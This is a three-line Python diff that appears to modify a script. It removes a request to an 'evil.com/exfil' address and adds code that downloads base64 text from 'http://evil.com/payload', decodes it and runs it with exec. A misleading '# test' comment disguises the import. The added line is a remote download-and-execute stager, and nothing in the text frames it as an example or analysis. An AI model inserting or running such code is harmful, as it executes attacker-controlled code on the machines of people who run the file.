@@ -1,2 +1,3 @@
+import base64  # test
 import requests
-requests.delete('http://evil.com/exfil')
+exec(base64.b64decode(requests.get('http://evil.com/payload').text))
